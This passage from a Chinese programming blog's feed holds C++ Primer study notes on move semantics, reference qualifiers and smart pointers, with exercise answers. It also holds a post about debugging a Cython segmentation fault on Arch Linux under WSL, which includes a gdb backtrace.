class="built_in">int</span>(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 在这里是移动的操作而不是拷贝操作，因此是合法的。</p><h5 id="练习13-53">练习13.53</h5><p>Q: 从底层效率的角度看，<code>HasPtr</code> 的赋值运算符并不理想，解释为什么？为 <code>HasPtr</code> 实现一个拷贝赋值运算符和一个移动赋值运算符，并比较你的新的移动赋值运算符中执行的操作和拷贝并交换版本中的执行的操作。</p><p>A:</p><ul><li><code>hp = hp2;</code> 在进行拷贝赋值时，先通过拷贝构造创建了hp2的副本rhs，然后再交换hp和rhs，rhs作为一个中间媒介，只是起到了将值从hp2传递给hp的作用，是一个冗余的操作。</li><li><code>hp = std::move(hp2);</code> 在进行移动赋值时，先从hp2转移到了rhs，然后再交换到hp，也是冗余的。</li><li>也就是说，这种实现方式唯一的好处是统一了拷贝和移动赋值运算，但在性能上多了一次从rhs的间接传递，性能不好。</li></ul><h5 id="练习13-54">练习13.54</h5><p>Q: 如果我们为 <code>HasPtr</code> 定义了移动赋值运算符，但未改变拷贝并交换运算符，会发生什么？编写代码验证你的答案。</p><p>A: 会产生编译错误。因为对于<code>hp = std::move(hp2)</code>这样的赋值语句来说，两个运算符匹配得一样好，从而产生了二义性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error: ambiguous overload <span class="keyword">for</span> <span class="string">&#x27;operator=&#x27;</span> (operand types are <span class="string">&#x27;HasPtr&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;std::remove_reference&lt;HasPtr&amp;&gt;::type &#123; aka HasPtr &#125;&#x27;</span>)</span><br><span class="line">hp1 = std::<span class="built_in">move</span>(*pH);</span><br><span class="line">^</span><br></pre></td></tr></table></figure><h3 id="右值引用和成员函数">右值引用和成员函数</h3><h4 id="右值和左值引用成员函数">右值和左值引用成员函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::push_back</span><span class="params">(<span class="type">const</span> string &amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::push_back</span><span class="params">(string &amp;&amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++, std::<span class="built_in">move</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>区分移动和拷贝的重载函数通常有一个版本接受一个<code>const T&amp;</code>，而另一个版本接受一个<code>T&amp;&amp;</code>。</strong></li><li>引用限定符：<ul><li>在参数列表后面防止一个<code>&amp;</code>，限定只能向可修改的左值赋值而不能向右值赋值。</li><li>引用限定符可以是<code>&amp;</code>或<code>&amp;&amp;</code>，分别指出this可以指向一个左值或一个右值。<br>类似const限定符，引用限定符只能出现在（非static）成员函数，且必须同时出现在函数的声明和定义中。</li><li>一个函数可以同时用const和引用限定，引用限定符必须放在const限定符之后。</li></ul></li></ul><h4 id="重载和和引用函数">重载和和引用函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function">Foo <span class="title">sorted</span><span class="params">()</span> &amp;&amp;</span>;       <span class="comment">// 用于可改变的右值</span></span><br><span class="line">  <span class="function">Foo <span class="title">sorted</span><span class="params">()</span> <span class="type">const</span> &amp;</span>;  <span class="comment">// 用于任何类型的Foo</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象为右值, 可以原地排序</span></span><br><span class="line"><span class="function">Foo <span class="title">Foo::sorted</span><span class="params">()</span> &amp;&amp; </span>&#123;</span><br><span class="line">  std::<span class="built_in">sort</span>(data.<span class="built_in">begin</span>(), data.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象是一个const或一个左值, 哪种情况都不能对其原址排序</span></span><br><span class="line"><span class="function">Foo <span class="title">Foo::sorted</span><span class="params">()</span> <span class="type">const</span> &amp; </span>&#123;</span><br><span class="line">  <span class="function">Foo <span class="title">ret</span><span class="params">(*<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  std::<span class="built_in">sort</span>(ret.data.<span class="built_in">begin</span>(), ret.data.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当对一个右值执行<code>sorted</code>时，可以安全地直接对其<code>data</code>成员进行排序。<br>对象是一个右值意味着没有其他用户，可以改变对象。</li><li>当对一个const右值或一个左值执行sorted时，不能改变对象，需要在排序前拷贝data。</li><li>如果一个成员函数有引用限定符，则具有相同参数列表的所有版本都必须有引用限定符。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">retVal</span>().<span class="built_in">sorted</span>(); <span class="comment">// retVal()是一个右值, 调用Foo::sorted() &amp;&amp;</span></span><br><span class="line"><span class="built_in">retFoo</span>().<span class="built_in">sorted</span>(); <span class="comment">// retFoo()是一个左值, 调用Foo::sorted() const &amp;</span></span><br></pre></td></tr></table></figure><h5 id="练习13-56">练习13.56</h5><p>Q: 如果 <code>sorted</code>定义如下，会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Foo <span class="title">Foo::sorted</span><span class="params">()</span> <span class="type">const</span> &amp; </span>&#123; <span class="keyword">return</span> <span class="built_in">Foo</span>(*<span class="keyword">this</span>).<span class="built_in">sorted</span>(); &#125;</span><br></pre></td></tr></table></figure><p>A: 可以正确利用右值引用版本来完成排序。<br>编译器会认为<code>Foo(*this)</code>是一个“无主”的右值，对它调用<code>sorted</code>会匹配右值版本。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Archlinux WSL Segment Fault on Cypthon</title>
      <link href="/2023/11/30/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-Archlinux-WSL-Segment-Fault/"/>
      <url>/2023/11/30/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-Archlinux-WSL-Segment-Fault/</url>
      
        <content type="html"><![CDATA[<h1 id="先上结论：不要使用Archlinux-WSL">先上结论：不要使用Archlinux WSL</h1><p>重要的事情说三遍：</p><ol><li>不要使用Archlinux WSL</li><li>不要使用Archlinux WSL</li><li>不要使用Archlinux WSL</li></ol><p>看看<a href="https://bbs.archlinux.org/viewtopic.php?id=249547">Archlinux on WSL? / Other Architectures / Arch Linux Forums</a>中大伙的评论：</p><ul><li>It seems to be a set of initial unconfigured packages that you have to configure yourself.</li><li>It isn’t Arch, and it isn’t supported by the community.</li><li>Or is it maybe something unacceptable about it?<br>Correct, see <a href="http://archlinux.2023198.n4.nabble.com/Windows-Subsystem-Linux-Arch-Linux-as-official-container-td4718272.html#a4718292">http://archlinux.2023198.n4.nabble.com/ … l#a4718292</a></li></ul><p>官方和社区都不支持，那还玩啥？</p><h1 id="问题">问题</h1><p>下面给出一个我在使用ArchLinux WSL中遇到的问题：</p><p>当使用python运行一个使用了Cpython的脚本时，引发了<code>segment fault</code>，显示保存信息极少。使用<code>gdb python</code>然后<code>run &lt;script.py&gt;</code>进行调试，然后<code>backtrace</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">Thread 1 <span class="string">&quot;python&quot;</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007fffcc488f3a <span class="keyword">in</span> std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;::sentry::sentry (this=0x7fffffffc980, __os=...)</span><br><span class="line">    at /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream.tcc:51</span><br><span class="line">51      /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream.tcc: No such file or directory.</span><br><span class="line">(gdb) run fill_time.py</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/jkup/.conda/envs/quant/bin/python fill_time.py</span><br><span class="line">[Thread debugging using libthread_db enabled]                                                                                                                                                                                               </span><br><span class="line">Using host libthread_db library <span class="string">&quot;/usr/lib/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff45ff6c0 (LWP 3265)]                                                                                                                                                                                                      </span><br><span class="line">[New Thread 0x7ffff1dfe6c0 (LWP 3266)]</span><br><span class="line">[New Thread 0x7fffef5fd6c0 (LWP 3267)]</span><br><span class="line">[New Thread 0x7fffecdfc6c0 (LWP 3268)]</span><br><span class="line">[New Thread 0x7fffec5fb6c0 (LWP 3269)]</span><br><span class="line">[New Thread 0x7fffe7dfa6c0 (LWP 3270)]</span><br><span class="line">[New Thread 0x7fffe55f96c0 (LWP 3271)]</span><br><span class="line">[New Thread 0x7fffe2df86c0 (LWP 3272)]</span><br><span class="line">[New Thread 0x7fffe05f76c0 (LWP 3273)]</span><br><span class="line">[New Thread 0x7fffdddf66c0 (LWP 3274)]</span><br><span class="line">[New Thread 0x7fffdb5f56c0 (LWP 3275)]</span><br><span class="line">[New Thread 0x7fffd8df46c0 (LWP 3276)]</span><br><span class="line">[New Thread 0x7fffd65f36c0 (LWP 3277)]</span><br><span class="line">[New Thread 0x7fffd3df26c0 (LWP 3278)]</span><br><span class="line">[New Thread 0x7fffd35f16c0 (LWP 3279)]</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">Thread 1 <span class="string">&quot;python&quot;</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007fffcc488f3a <span class="keyword">in</span> std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;::sentry::sentry (this=0x7fffffffc980, __os=...)</span><br><span class="line">    at /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream.tcc:51</span><br><span class="line">51      /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream.tcc: No such file or directory.</span><br><span class="line">(gdb) backtrace</span><br><span class="line"><span class="comment">#0  0x00007fffcc488f3a in std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;::sentry::sentry (this=0x7fffffffc980, __os=...)</span></span><br><span class="line">    at /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream.tcc:51</span><br><span class="line"><span class="comment">#1  0x00007fffcc48967c in std::__ostream_insert&lt;char, std::char_traits&lt;char&gt; &gt; (__out=..., __s=0x7fffcbc27573 &quot;on &quot;, __n=3)</span></span><br><span class="line">    at /opt/conda/conda-bld/gcc-compiler_1654084175708/work/build/gcc-final/x86_64-conda-linux-gnu/libstdc++-v3/include/bits/ostream_insert.h:83</span><br><span class="line"><span class="comment">#2  0x00007fffcbc24e6b in OrderBook::on_order(int, int, int, int, int, int, int, bool) () from /home/jkup/Quant/cython_orderbook-master/odb.cpython-310-x86_64-linux-gnu.so</span></span><br><span class="line"><span class="comment">#3  0x00007fffcbc21f93 in __pyx_pw_3odb_11PyOrderBook_7on_order(_object*, _object* const*, long, _object*) () from /home/jkup/Quant/cython_orderbook-master/odb.cpython-310-x86_64-linux-gnu.so</span></span><br><span class="line"><span class="comment">#4  0x000000000050825a in _PyObject_VectorcallTstate (kwnames=&lt;optimized out&gt;, nargsf=&lt;optimized out&gt;, args=&lt;optimized out&gt;, callable=0x7fffcbc41e50, tstate=0x75b780)</span></span><br><span class="line">    at /usr/local/src/conda/python-3.10.13/Include/cpython/abstract.h:114</span><br><span class="line"><span class="comment">#5  method_vectorcall (method=&lt;optimized out&gt;, args=&lt;optimized out&gt;, nargsf=&lt;optimized out&gt;, kwnames=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Objects/classobject.c:83</span></span><br><span class="line"><span class="comment">#6  0x00000000004efb19 in do_call_core (kwdict=0x0, callargs=0x7fffc6a525e0, func=0x7fffcb0a8c00, trace_info=0x7fffffffccc0, tstate=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5945</span></span><br><span class="line"><span class="comment">#7  _PyEval_EvalFrameDefault (tstate=&lt;optimized out&gt;, f=0x7fffcb252dc0, throwflag=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:4277</span></span><br><span class="line"><span class="comment">#8  0x00000000004fcadf in _PyEval_EvalFrame (throwflag=0, f=0x7fffcb252dc0, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Include/internal/pycore_ceval.h:46</span></span><br><span class="line"><span class="comment">#9  _PyEval_Vector (kwnames=&lt;optimized out&gt;, argcount=&lt;optimized out&gt;, args=&lt;optimized out&gt;, locals=0x0, con=0x7fffcb53d6d0, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5067</span></span><br><span class="line"><span class="comment">#10 _PyFunction_Vectorcall (func=0x7fffcb53d6c0, stack=&lt;optimized out&gt;, nargsf=&lt;optimized out&gt;, kwnames=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Objects/call.c:342</span></span><br><span class="line"><span class="comment">#11 0x00000000004ed2bf in _PyObject_VectorcallTstate (kwnames=0x0, nargsf=&lt;optimized out&gt;, args=0x16433d0, callable=0x7fffcb53d6c0, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Include/cpython/abstract.h:114</span></span><br><span class="line"><span class="comment">#12 PyObject_Vectorcall (kwnames=0x0, nargsf=&lt;optimized out&gt;, args=0x16433d0, callable=0x7fffcb53d6c0) at /usr/local/src/conda/python-3.10.13/Include/cpython/abstract.h:123</span></span><br><span class="line"><span class="comment">#13 call_function (kwnames=0x0, oparg=&lt;optimized out&gt;, pp_stack=&lt;synthetic pointer&gt;, trace_info=0x7fffffffce80, tstate=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5893</span></span><br><span class="line"><span class="comment">#14 _PyEval_EvalFrameDefault (tstate=&lt;optimized out&gt;, f=0x1643140, throwflag=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:4213</span></span><br><span class="line"><span class="comment">#15 0x00000000004fcadf in _PyEval_EvalFrame (throwflag=0, f=0x1643140, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Include/internal/pycore_ceval.h:46</span></span><br><span class="line"><span class="comment">#16 _PyEval_Vector (kwnames=&lt;optimized out&gt;, argcount=&lt;optimized out&gt;, args=&lt;optimized out&gt;, locals=0x0, con=0x7fffcbcb91c0, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5067</span></span><br><span class="line"><span class="comment">#17 _PyFunction_Vectorcall (func=0x7fffcbcb91b0, stack=&lt;optimized out&gt;, nargsf=&lt;optimized out&gt;, kwnames=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Objects/call.c:342</span></span><br><span class="line"><span class="comment">#18 0x00000000004ee353 in _PyObject_VectorcallTstate (kwnames=0x7ffff78a35e0, nargsf=&lt;optimized out&gt;, args=&lt;optimized out&gt;, callable=0x7fffcbcb91b0, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Include/cpython/abstract.h:114</span></span><br><span class="line"><span class="comment">#19 PyObject_Vectorcall (kwnames=0x7ffff78a35e0, nargsf=&lt;optimized out&gt;, args=&lt;optimized out&gt;, callable=0x7fffcbcb91b0) at /usr/local/src/conda/python-3.10.13/Include/cpython/abstract.h:123</span></span><br><span class="line"><span class="comment">#20 call_function (kwnames=0x7ffff78a35e0, oparg=&lt;optimized out&gt;, pp_stack=&lt;synthetic pointer&gt;, trace_info=0x7fffffffd040, tstate=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5893</span></span><br><span class="line"><span class="comment">#21 _PyEval_EvalFrameDefault (tstate=&lt;optimized out&gt;, f=0x7ffff791da40, throwflag=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:4231</span></span><br><span class="line"><span class="comment">#22 0x0000000000591d92 in _PyEval_EvalFrame (throwflag=0, f=0x7ffff791da40, tstate=0x75b780) at /usr/local/src/conda/python-3.10.13/Include/internal/pycore_ceval.h:46</span></span><br><span class="line"><span class="comment">#23 _PyEval_Vector (tstate=tstate@entry=0x75b780, con=con@entry=0x7fffffffd140, locals=locals@entry=0x7ffff7835480, args=args@entry=0x0, argcount=argcount@entry=0, kwnames=kwnames@entry=0x0)</span></span><br><span class="line">    at /usr/local/src/conda/python-3.10.13/Python/ceval.c:5067</span><br><span class="line"><span class="comment">#24 0x0000000000591cd7 in PyEval_EvalCode (co=co@entry=0x7ffff7877b50, globals=globals@entry=0x7ffff7835480, locals=locals@entry=0x7ffff7835480) at /usr/local/src/conda/python-3.10.13/Python/ceval.c:1134</span></span><br><span class="line"><span class="comment">#25 0x00000000005c2967 in run_eval_code_obj (tstate=tstate@entry=0x75b780, co=co@entry=0x7ffff7877b50, globals=globals@entry=0x7ffff7835480, locals=locals@entry=0x7ffff7835480)</span></span><br><span class="line">    at /usr/local/src/conda/python-3.10.13/Python/pythonrun.c:1291</span><br><span class="line"><span class="comment">#26 0x00000000005bdad0 in run_mod (mod=mod@entry=0x899e28, filename=filename@entry=0x7ffff7838340, globals=globals@entry=0x7ffff7835480, locals=locals@entry=0x7ffff7835480, flags=flags@entry=0x7fffffffd338, </span></span><br><span class="line">    arena=arena@entry=0x7ffff78f7b90) at /usr/local/src/conda/python-3.10.13/Python/pythonrun.c:1312</span><br><span class="line"><span class="comment">#27 0x000000000045956b in pyrun_file (fp=fp@entry=0x757470, filename=filename@entry=0x7ffff7838340, start=start@entry=257, globals=globals@entry=0x7ffff7835480, locals=locals@entry=0x7ffff7835480, closeit=closeit@entry=1, </span></span><br><span class="line">    flags=0x7fffffffd338) at /usr/local/src/conda/python-3.10.13/Python/pythonrun.c:1208</span><br><span class="line"><span class="comment">#28 0x00000000005b805f in _PyRun_SimpleFileObject (fp=0x757470, filename=0x7ffff7838340, closeit=1, flags=0x7fffffffd338) at /usr/local/src/conda/python-3.10.13/Python/pythonrun.c:456</span></span><br><span class="line"><span class="comment">#29 0x00000000005b7dc3 in _PyRun_AnyFileObject (fp=0x757470, filename=filename@entry=0x7ffff7838340, closeit=closeit@entry=1, flags=flags@entry=0x7fffffffd338) at /usr/local/src/conda/python-3.10.13/Python/pythonrun.c:90</span></span><br><span class="line"><span class="comment">#30 0x00000000005b4b7d in pymain_run_file_obj (skip_source_first_line=0, filename=0x7ffff7838340, program_name=0x7ffff785ce70) at /usr/local/src/conda/python-3.10.13/Modules/main.c:357</span></span><br><span class="line"><span class="comment">#31 pymain_run_file (config=0x7825a0) at /usr/local/src/conda/python-3.10.13/Modules/main.c:376</span></span><br><span class="line"><span class="comment">#32 pymain_run_python (exitcode=0x7fffffffd330) at /usr/local/src/conda/python-3.10.13/Modules/main.c:591</span></span><br><span class="line"><span class="comment">#33 Py_RunMain () at /usr/local/src/conda/python-3.10.13/Modules/main.c:670</span></span><br><span class="line"><span class="comment">#34 0x0000000000584e49 in Py_BytesMain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at /usr/local/src/conda/python-3.10.13/Modules/main.c:1090</span></span><br><span class="line"><span class="comment">#35 0x00007ffff7d04cd0 in __libc_start_call_main (main=main@entry=0x584e00 &lt;main&gt;, argc=argc@entry=2, argv=argv@entry=0x7fffffffd568) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">#36 0x00007ffff7d04d8a in __libc_start_main_impl (main=0x584e00 &lt;main&gt;, argc=2, argv=0x7fffffffd568, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffd558) at ../csu/libc-start.c:360</span></span><br><span class="line">--Type &lt;RET&gt; <span class="keyword">for</span> more, q to quit, c to <span class="built_in">continue</span> without paging--</span><br><span class="line"><span class="comment">#37 0x0000000000584cfe in _start ()</span></span><br></pre></td></tr></table></figure><p>谷歌一圈，解决方案较少，并没有找到合适的解决方案。本来以为可能是使用<code>yay</code>安装到<code>/opt</code>下导致内存限制的问题。但重新在用户家目录下安装miniconda并未解决问题。</p><p>之前使用Archlinux也遇到过不少问题，但都可以在Arch Wiki下找到答案，而且很多是由于更新软件包时不看提示信息导致的，这次搜索没有看到明显的有效信息。</p><blockquote><p>既然官方和社区都不支持Archlinux Wsl，那就卸了吧，继续使用“邪恶混沌”的Ubuntu。</p><p>（虽然之前在做CMU15-213的Bomblab还是AttackLab时，在Ubuntu时运行程序也有问题，在Debian下没有问题……不过WSL还是要比VMware用着方便，将就着用吧）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 踩坑记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第12章 动态内存</title>
      <link href="/2023/11/18/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch12/"/>
      <url>/2023/11/18/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch12/</url>
      
        <content type="html"><![CDATA[<ul><li><p>对象的生命周期：</p><ul><li>全局对象在程序启动时分配，结束时销毁。</li><li>局部对象在进入程序块时创建，离开块时销毁。</li><li><strong>局部<code>static</code>对象在第一次使用前分配，在程序结束时销毁。</strong></li><li>动态分配对象：只能显式地被释放。</li></ul></li><li><p>对象的内存位置：</p><ul><li><strong>静态内存</strong>用来保存局部<code>static</code>对象、类<code>static</code>对象、定义在任何函数之外的变量。</li><li><strong>栈内存</strong>用来保存定义在函数内的非<code>static</code>对象。</li><li><strong>堆内存</strong>，又称自由空间，用来存储<strong>动态分配</strong>的对象。</li></ul></li><li><p>如果忘记释放内存就会产生<strong>内存泄漏</strong>；如果在尚有指针引用的情况下就释放就会产生引用非法内存的指针。</p></li></ul><h2 id="动态内存与智能指针">动态内存与智能指针</h2><ul><li>动态内存管理：<ul><li><code>new</code>：在动态内存中为对象分配空间并返回一个指向该对象的指针。</li><li><code>delete</code>：接受一个动态对象的指针，销毁该对象，并释放与之关联的内存。</li></ul></li><li>智能指针：<ul><li>管理动态对象。</li><li>行为类似常规指针。</li><li>负责自动释放所指向的对象。</li><li>智能指针也是模板。</li><li>定义在memory头文件中。</li></ul></li></ul><h3 id="shared-ptr类">shared_ptr类</h3><p><strong>shared_ptr和unique_ptr都支持的操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>shared_ptr&lt;T&gt; sp</code>  <code>unique_ptr&lt;T&gt; up</code></td><td>空智能指针，可以指向类型是<code>T</code>的对象</td></tr><tr><td><code>p</code></td><td>将<code>p</code>用作一个条件判断，若<code>p</code>指向一个对象，则为<code>true</code></td></tr><tr><td><code>*p</code></td><td>解引用<code>p</code>，获得它指向的对象。</td></tr><tr><td><code>p-&gt;mem</code></td><td>等价于<code>(*p).mem</code></td></tr><tr><td><code>p.get()</code></td><td><strong>返回<code>p</code>中保存的指针</strong>，要小心使用，若智能指针释放了对象，返回的指针所指向的对象也就消失了。</td></tr><tr><td><code>swap(p, q)</code> <code>p.swap(q)</code></td><td>交换<code>p</code>和<code>q</code>中的指针</td></tr></tbody></table><p><strong>shared_ptr独有的操作</strong>：</p><p>最安全的分配和使用动态内存的方法是调用一个名为<code>make_shared</code>的标准库函数。</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>make_shared&lt;T&gt;(args)</code></td><td>返回一个<code>shared_ptr</code>，指向一个动态分配的类型为<code>T</code>的对象。使用<code>args</code>初始化此对象（类似于顺序容器的emplace）。</td></tr><tr><td><code>shared_ptr&lt;T&gt;p(q)</code></td><td><code>p</code>是<code>shared_ptr q</code>的拷贝；此操作会<strong>递增</strong><code>q</code>中的计数器。<code>q</code>中的指针必须能转换为<code>T*</code></td></tr><tr><td><code>p = q</code></td><td><code>p</code>和<code>q</code>都是<code>shared_ptr</code>，所保存的指针必须能互相转换。此操作会<strong>递减</strong><code>p</code>的引用计数，<strong>递增</strong><code>q</code>的引用计数；若<code>p</code>的引用计数变为0，则将其管理的原内存释放。</td></tr><tr><td><code>p.unique()</code></td><td>若<code>p.use_count()</code>是1，返回<code>true</code>；否则返回<code>false</code></td></tr><tr><td><code>p.use_count()</code></td><td>返回与<code>p</code>共享对象的智能指针数量；可能很慢，主要用于调试。</td></tr></tbody></table><ul><li>当用一个shared_ptr初始化另一个shared_ptr，或讲它作为参数传递给一个函数，以及作为函数的返回值时，它所关联的计数器就会递增。</li><li>如果将shared_ptr存放在一个容器中，而后不再需要全部元素，而只使用其中的一部分，要记得使用erase删除不再需要的元素。</li><li><strong>使用动态内存的三种原因</strong>：<ul><li><strong>程序不知道自己需要使用多少对象（比如容器类）。</strong></li><li><strong>程序不知道所需要对象的准确类型。<sub>（第15章会讲）</sub></strong></li><li><strong>程序需要在多个对象间共享数据。</strong></li></ul></li><li>利用拷贝赋值运算符或拷贝构造vector时，都是深复制。</li></ul><h4 id="练习12-4">练习12.4</h4><p>Q: 在我们的 <code>check</code> 函数中，没有检查 <code>i</code> 是否大于0。为什么可以忽略这个检查？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(size_type i, <span class="type">const</span> string &amp;msg)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= data-&gt;<span class="built_in">size</span>()) <span class="keyword">throw</span> std::<span class="built_in">out_of_range</span>(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 因为 <code>size_type</code> 是一个无符号整型，当传递给 <code>check</code> 的参数小于 0 的时候，参数值会转换成一个正整数。</p><h3 id="直接管理内存">直接管理内存</h3><p>默认情况下，动态分配对象使用默认初始化（P40），内置类型或组合类型的对象的值是未定义的，而类类型对象使用默认构造函数进行初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string *ps1 = <span class="keyword">new</span> string;  <span class="comment">// 默认初始化为空string</span></span><br><span class="line">string *ps = <span class="keyword">new</span> <span class="built_in">string</span>();  <span class="comment">// 值初始化为空string</span></span><br><span class="line"><span 